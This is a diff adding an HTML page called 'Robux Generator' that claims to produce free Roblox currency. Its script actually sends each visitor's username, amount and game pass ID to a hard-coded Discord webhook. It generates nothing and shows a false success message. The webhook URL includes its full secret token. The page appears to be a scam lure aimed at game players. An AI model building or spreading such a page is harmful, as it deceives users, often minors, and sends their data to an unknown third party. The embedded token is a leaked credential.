@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Generator</title>
+    <style>
+        body {
+            background-color: black;
+            color: green;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 50%;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid green;
+            border-radius: 10px;
+            background-color: black;
+            color: green;
+            box-shadow: 0 0 10px green;
+        }
+        h1 {
+            text-align: center;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid green;
+            border-radius: 5px;
+            background-color: black;
+            color: green;
+        }
+        button {
+            cursor: pointer;
+        }
+        label {
+            margin-top: 10px;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Robux Generator</h1>
+        <form id="robuxForm">
+            <label for="username">Enter your username:</label>
+            <input type="text" id="username" name="username" required>
+            <label for="amount">Enter amount of Robux in the Pass:</label>
+            <input type="number" id="amount" name="amount" required>
+            <label for="gamepass">Enter Game Pass ID:</label>
+            <input type="text" id="gamepass" name="gamepass" required>
+            <button type="submit">Generate</button>
+        </form>
+        <p id="message"></p>
+    </div>
+    <script type="text/javascript">
+        document.getElementById('robuxForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            var username = document.getElementById('username').value;
+            var amount = document.getElementById('amount').value;
+            var gamepass = document.getElementById('gamepass').value;
+
+            var payload = {
+                username: username,
+                amount: amount,
+                gamepass: gamepass,
+                version: "v1.0"
+            };
+
+            var webhookUrl = "https://discord.com/api/webhooks/1265904458135502868/6v_BV29-2rGb6emJCwLOWBlJ786WQUGeAC1SmPD4SoyekjQq_aN2WMQt-7U00_R2dCz4";
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `Robux Generator Submission\nUsername: ${username}\nAmount: ${amount} RBX\nGame Pass ID: ${gamepass}\nVersion: v1.0 Web`
+                })
+            })
+            .then(response => {
+                if(response.ok) {
+                    document.getElementById('message').innerText = 'Request submitted successfully!';
+                } else {
+                    document.getElementById('message').innerText = 'Failed to submit request.';
+                }
+            })
+            .catch(error => {
+                document.getElementById('message').innerText = 'An error occurred: ' + error.message;
+            });
+        });
+    </script>
+</body>
+</html>
